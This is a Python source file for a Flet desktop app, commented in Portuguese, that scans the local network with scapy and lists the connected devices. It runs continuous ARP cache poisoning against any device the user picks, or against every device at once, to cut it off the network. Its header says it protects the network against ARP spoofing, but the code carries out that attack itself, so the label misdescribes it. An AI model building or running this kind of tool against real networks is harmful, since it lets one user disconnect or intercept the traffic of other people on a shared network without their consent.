import flet as ft
import asyncio
import socket
import threading
import time
from scapy.all import ARP, Ether, srp, send

# ==============================================================================
# Backend: Funções de rede (mantidas do seu código original)
# ==============================================================================

def get_gateway_ip():
    """Tenta obter o IP do gateway da rede local."""
    try:
        # Usando uma rota padrão para encontrar o gateway
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        return ".".join(local_ip.split('.')[:-1]) + ".1"
    except Exception:
        # Fallback se o método acima falhar
        try:
            local_ip = socket.gethostbyname(socket.gethostname())
            return ".".join(local_ip.split('.')[:-1]) + ".1"
        except Exception:
            return "192.168.1.1"  # Último recurso

def get_mac(ip):
    """Obtém o endereço MAC de um determinado endereço IP."""
    answered, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=2, retry=3, verbose=False)
    for _, r in answered:
        return r[Ether].src
    return None

def scan_network(network):
    """Escaneia a rede para encontrar dispositivos conectados."""
    devices = []
    arp_request = ARP(pdst=network)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = srp(arp_request_broadcast, timeout=2, verbose=False)[0]

    for element in answered_list:
        device = {'ip': element[1].psrc, 'mac': element[1].hwsrc, 'status': 'Conectado'}
        devices.append(device)
    return devices

def spoof(target_ip, spoof_ip):
    """Envia um pacote ARP para envenenar o cache ARP do alvo."""
    target_mac = get_mac(target_ip)
    if target_mac:
        packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        send(packet, verbose=False)

def restore(target_ip, source_ip):
    """Restaura o cache ARP do alvo para o estado original."""
    target_mac = get_mac(target_ip)
    source_mac = get_mac(source_ip)
    if target_mac and source_mac:
        packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip, hwsrc=source_mac)
        send(packet, count=4, verbose=False)

def start_attack(target_ip, gateway_ip, attacking_state):
    """Inicia o ataque de ARP spoofing em uma thread separada."""
    if target_ip == gateway_ip:
        return

    def attack_loop():
        while attacking_state.get(target_ip):
            spoof(target_ip, gateway_ip)
            spoof(gateway_ip, target_ip)
            time.sleep(2)

    attacking_state[target_ip] = True
    thread = threading.Thread(target=attack_loop, daemon=True)
    thread.start()

def stop_attack(target_ip, gateway_ip, attacking_state):
    """Para o ataque de ARP spoofing e restaura a rede."""
    if target_ip in attacking_state:
        attacking_state[target_ip] = False
        time.sleep(0.1)  # Dá tempo para a thread parar
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)

# ==============================================================================
# Frontend: Aplicação Flet com o novo design
# ==============================================================================

class NetworkControlApp:
    def __init__(self, page: ft.Page):
        self.page = page
        self.page.title = "Painel de Controle da Rede"
        self.page.theme_mode = ft.ThemeMode.DARK
        self.page.bgcolor = "#111827"  # bg-gray-900
        self.page.padding = ft.padding.all(0)
        self.page.fonts = {"Inter": "https://rsms.me/inter/font-files/Inter-Regular.otf?v=3.19"}
        self.page.theme = ft.Theme(font_family="Inter")
        self.page.window_min_width = 600
        self.page.window_min_height = 700

        # --- Estado da Aplicação ---
        self.attacking = {}
        self.all_devices = []
        self.local_ip = self.get_local_ip()
        self.gateway_ip = get_gateway_ip()
        self.stop_scan_requested = False
        self.scanning = False  # <- novo estado de escaneamento

        # --- Controles da UI ---
        self.search_field = ft.TextField(
            hint_text="Buscar por IP, MAC ou nome...",
            prefix_icon=ft.Icons.SEARCH,
            border_color="#374151",  # border-gray-700
            focused_border_color="#3b82f6",  # ring-blue-500
            border_radius=8,
            on_change=self.filter_devices,
            height=40,
            content_padding=ft.padding.symmetric(horizontal=12),
        )

        # Botão ÚNICO de alternância (iniciar/parar scan)
        self.scan_toggle_button = ft.ElevatedButton(
            content=ft.Row(
                [
                    ft.Icon(ft.Icons.WIFI, size=20),
                    ft.Text("Escanear Rede", weight=ft.FontWeight.W_600),
                ],
                alignment=ft.MainAxisAlignment.CENTER,
            ),
            on_click=self.toggle_scan,
            height=40,  # <-- força altura igual ao TextField
            style=ft.ButtonStyle(
                bgcolor="#2563eb",
                color="white",
                shape=ft.RoundedRectangleBorder(radius=8),
                padding=ft.padding.symmetric(horizontal=16),  # padding só horizontal
            )
        )


        self.block_all_button = self.create_mass_action_button("Bloquear Todos", ft.Icons.SHIELD_OUTLINED, "#f87171", self.mass_block)
        self.unblock_all_button = self.create_mass_action_button("Liberar Todos", ft.Icons.SHIELD, "#4ade80", self.mass_unblock)

        self.devices_list_view = ft.ListView(expand=True, spacing=4, padding=ft.padding.symmetric(horizontal=8))

        self.build_layout()
        # Escaneamento inicial opcional
        self.page.run_task(self.initial_scan)

    def get_local_ip(self):
        """Obtém o IP local da máquina."""
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            s.connect(('10.255.255.255', 1))
            IP = s.getsockname()[0]
        except Exception:
            IP = '127.0.0.1'
        finally:
            s.close()
        return IP

    def create_mass_action_button(self, text, icon, color, on_click):
        """Cria um botão de ação em massa (Bloquear/Liberar Todos)."""
        return ft.TextButton(
            content=ft.Row([ft.Icon(icon, size=16, color=color), ft.Text(text, size=12, color=color)]),
            on_click=on_click,
            style=ft.ButtonStyle(overlay_color=ft.Colors.with_opacity(0.1, color))
        )

    def build_layout(self):
        """Constrói o layout principal da página."""
        main_container = ft.Container(
            expand=True,
            content=ft.Column(
                [
                    # --- Cabeçalho ---
                    ft.Container(
                        content=ft.Column([
                            ft.Text("Painel de Controle da Rede", size=28, weight=ft.FontWeight.BOLD),
                            ft.Text("Gerencie dispositivos e proteja sua rede contra ARP Spoofing.", color=ft.Colors.GREY_400),
                        ]),
                        padding=ft.padding.only(top=20, left=20, right=20, bottom=10)
                    ),

                    # --- Ações Principais (Busca e Scan) ---
                    ft.Container(
                        content=ft.ResponsiveRow(
                            [
                                ft.Container(self.search_field, col={"xs": 12, "sm": 7, "md": 6, "lg": 6}),
                                ft.Container(self.scan_toggle_button, col={"xs": 12, "sm": 5, "md": 3, "lg": 2}),

                            ],
                            vertical_alignment=ft.CrossAxisAlignment.CENTER,
                            alignment=ft.MainAxisAlignment.SPACE_BETWEEN,
                        ),
                        padding=ft.padding.symmetric(horizontal=20, vertical=10)
                    ),


                    # --- Card da Lista de Dispositivos ---
                    ft.Container(
                        expand=True,
                        content=ft.Column([
                            ft.Container(
                                content=ft.Row([
                                    ft.Text("Dispositivos Conectados", weight=ft.FontWeight.W_600, size=16),
                                    ft.Row([self.block_all_button, self.unblock_all_button])
                                ], alignment=ft.MainAxisAlignment.SPACE_BETWEEN),
                                padding=ft.padding.only(left=16, right=8, top=12, bottom=8),
                                border=ft.border.only(bottom=ft.border.BorderSide(1, "#374151"))
                            ),
                            self.devices_list_view,
                        ]),
                        bgcolor="#1f2937",  # bg-gray-800
                        border=ft.border.all(1, "#374151"),  # border-gray-700
                        border_radius=12,
                        margin=ft.margin.all(20),
                        shadow=ft.BoxShadow(
                            spread_radius=1,
                            blur_radius=15,
                            color=ft.Colors.with_opacity(0.2, "black"),
                            offset=ft.Offset(0, 5),
                        )
                    )
                ]
            )
        )
        self.page.add(main_container)

    def create_device_card(self, device):
        """Cria um card para um dispositivo individual."""
        ip = device['ip']
        mac = device['mac']
        status = device['status']

        # Determina o ícone e a cor com base no status/tipo
        if status == 'Gateway Padrão':
            icon_name = ft.Icons.ROUTER_OUTLINED
            icon_color = "#60a5fa"  # text-blue-400
            icon_bg = "#1e40af"  # bg-blue-500/20
        elif status == 'Este Dispositivo':
            icon_name = ft.Icons.LAPTOP_MAC_OUTLINED
            icon_color = "#a78bfa"  # text-indigo-400
            icon_bg = "#4338ca"  # bg-indigo-500/20
        elif status == 'Bloqueado':
            icon_name = ft.Icons.NO_CELL_OUTLINED
            icon_color = "#f87171"  # text-red-400
            icon_bg = "#991b1b"  # bg-red-500/20
        else:  # Conectado
            # Tenta adivinhar o tipo de dispositivo pelo MAC (simplificado)
            if any(vendor in mac.lower() for vendor in ["00:03:93", "00:10:db"]):  # Apple
                icon_name = ft.Icons.PHONE_IPHONE
            elif any(vendor in mac.lower() for vendor in ["3c:5a:b4", "f8:e0:79"]):  # Google
                icon_name = ft.Icons.PHONE_ANDROID
            else:
                icon_name = ft.Icons.DEVICE_UNKNOWN
            icon_color = "#4ade80"  # text-green-400
            icon_bg = "#166534"  # bg-green-500/20

        device_icon = ft.Container(
            content=ft.Icon(name=icon_name, color=icon_color),
            width=48, height=48,
            bgcolor=icon_bg,
            border_radius=24,
            alignment=ft.alignment.center
        )

        # Badge de Status
        if status == 'Conectado':
            status_badge = ft.Row([ft.Container(width=8, height=8, bgcolor="#4ade80", border_radius=4), ft.Text("Conectado", color="#4ade80", size=12)])
        elif status == 'Bloqueado':
            status_badge = ft.Row([ft.Container(width=8, height=8, bgcolor="#f87171", border_radius=4), ft.Text("Bloqueado", color="#f87171", size=12)])
        else:
            status_badge = ft.Text(status, color="#a78bfa", size=12, weight=ft.FontWeight.W_600)

        # Botão de Ação
        action_button = ft.Container()
        if status not in ['Gateway Padrão', 'Este Dispositivo']:
            is_blocked = status == 'Bloqueado'
            btn_text = "Liberar" if is_blocked else "Bloquear"
            btn_icon = ft.Icons.CHECK_CIRCLE_OUTLINE if is_blocked else ft.Icons.BLOCK
            btn_bgcolor = "#16a34a" if is_blocked else "#4b5563"  # bg-green-600 : bg-gray-600

            action_button = ft.ElevatedButton(
                text=btn_text,
                icon=btn_icon,
                on_click=lambda _, d=device: self.toggle_device_attack(d),
                height=38,
                style=ft.ButtonStyle(
                    bgcolor=btn_bgcolor,
                    color="white",
                    shape=ft.RoundedRectangleBorder(radius=8)
                )
            )

        card_content = ft.ResponsiveRow(
            [
                ft.Container(
                    content=ft.Row([
                        device_icon,
                        ft.Column([
                            ft.Text(ip, weight=ft.FontWeight.BOLD, size=15),
                            ft.Text(mac, color=ft.Colors.GREY_500, size=12, font_family="monospace"),
                        ], spacing=2),
                    ]),
                    col={"xs": 12, "sm": 6}
                ),
                ft.Container(
                    content=ft.Row([status_badge, action_button], alignment=ft.MainAxisAlignment.END, spacing=12),
                    alignment=ft.alignment.center_right,
                    col={"xs": 12, "sm": 6}
                ),
            ],
            vertical_alignment=ft.CrossAxisAlignment.CENTER,
            alignment=ft.MainAxisAlignment.SPACE_BETWEEN
        )

        return ft.Container(
            content=card_content,
            padding=ft.padding.all(12),
            border_radius=8,
            ink=True,
            bgcolor=ft.Colors.with_opacity(0.02, "white") if status != 'Este Dispositivo' else ft.Colors.with_opacity(0.1, "#a78bfa"),
            data=device  # Armazena os dados do dispositivo no controle
        )

    def update_device_list(self, devices_to_display):
        """Atualiza a lista de dispositivos na UI."""
        # Ordena os dispositivos
        def sort_key(d):
            ip = d['ip']
            if ip == self.gateway_ip:
                return (0,)
            if ip == self.local_ip:
                return (1,)
            return (2, tuple(int(p) for p in ip.split('.')))

        sorted_devices = sorted(devices_to_display, key=sort_key)

        self.devices_list_view.controls.clear()
        for device in sorted_devices:
            self.devices_list_view.controls.append(self.create_device_card(device))
        self.page.update()

    async def toggle_scan(self, e):
        """Alterna entre iniciar e parar o escaneamento."""
        if not self.scanning:
            # Iniciar scan
            self.scanning = True
            self.stop_scan_requested = False
            # Muda visual do botão para "Parar"
            self.scan_toggle_button.content.controls[0].name = ft.Icons.STOP_CIRCLE
            self.scan_toggle_button.content.controls[1].value = "Parar Scan"
            self.scan_toggle_button.style.bgcolor = "#dc2626"  # Vermelho
            self.page.update()

            # Executa o scan
            await self.run_scan_task()

            # Ao terminar (naturalmente ou por stop), voltar ao estado pronto
            self.scanning = False
            self.scan_toggle_button.content.controls[0].name = ft.Icons.WIFI
            self.scan_toggle_button.content.controls[1].value = "Escanear Rede"
            self.scan_toggle_button.style.bgcolor = "#2563eb"  # Azul
            self.page.update()
        else:
            # Parar scan
            self.stop_scan_requested = True

    async def run_scan_task(self):
        """Executa o processo de escaneamento e atualiza a UI."""
        try:
            network_cidr = f"{'.'.join(self.gateway_ip.split('.')[:-1])}.0/24"
            scanned_devices = await asyncio.to_thread(scan_network, network_cidr)

            if not self.stop_scan_requested:
                if not any(d['ip'] == self.gateway_ip for d in scanned_devices):
                    scanned_devices.append({'ip': self.gateway_ip, 'mac': get_mac(self.gateway_ip) or '??:??:??:??:??:??', 'status': 'Conectado'})
                if not any(d['ip'] == self.local_ip for d in scanned_devices):
                    scanned_devices.append({'ip': self.local_ip, 'mac': get_mac(self.local_ip) or '??:??:??:??:??:??', 'status': 'Conectado'})

                self.all_devices = []
                for d in scanned_devices:
                    if d['ip'] == self.gateway_ip:
                        d['status'] = 'Gateway Padrão'
                    elif d['ip'] == self.local_ip:
                        d['status'] = 'Este Dispositivo'
                    elif self.attacking.get(d['ip']):
                        d['status'] = 'Bloqueado'
                    else:
                        d['status'] = 'Conectado'
                    self.all_devices.append(d)

                self.filter_devices(None)
        finally:
            # Não alteramos o botão aqui; o toggle_scan lida com isso.
            self.page.update()

    def filter_devices(self, e):
        """Filtra a lista de dispositivos com base no campo de busca."""
        search_term = self.search_field.value.lower() if self.search_field.value else ""
        if not search_term:
            self.update_device_list(self.all_devices)
            return

        filtered_devices = []
        for device in self.all_devices:
            if search_term in device['ip'].lower() or \
               search_term in device['mac'].lower():
                filtered_devices.append(device)
        self.update_device_list(filtered_devices)

    def toggle_device_attack(self, device):
        """Inicia ou para o ataque a um dispositivo."""
        ip_to_toggle = device['ip']
        is_currently_attacking = self.attacking.get(ip_to_toggle, False)

        if is_currently_attacking:
            stop_attack(ip_to_toggle, self.gateway_ip, self.attacking)
            device['status'] = 'Conectado'
        else:
            start_attack(ip_to_toggle, self.gateway_ip, self.attacking)
            device['status'] = 'Bloqueado'

        self.filter_devices(None)

    def mass_block(self, e):
        """Bloqueia todos os dispositivos elegíveis."""
        for device in self.all_devices:
            if device['status'] == 'Conectado':
                self.toggle_device_attack(device)

    def mass_unblock(self, e):
        """Libera todos os dispositivos bloqueados."""
        for device in self.all_devices:
            if device['status'] == 'Bloqueado':
                self.toggle_device_attack(device)

    async def initial_scan(self):
        """Realiza um escaneamento inicial ao carregar a aplicação."""
        await self.run_scan_task()

def main(page: ft.Page):
    app = NetworkControlApp(page)

if __name__ == "__main__":
    ft.app(target=main)
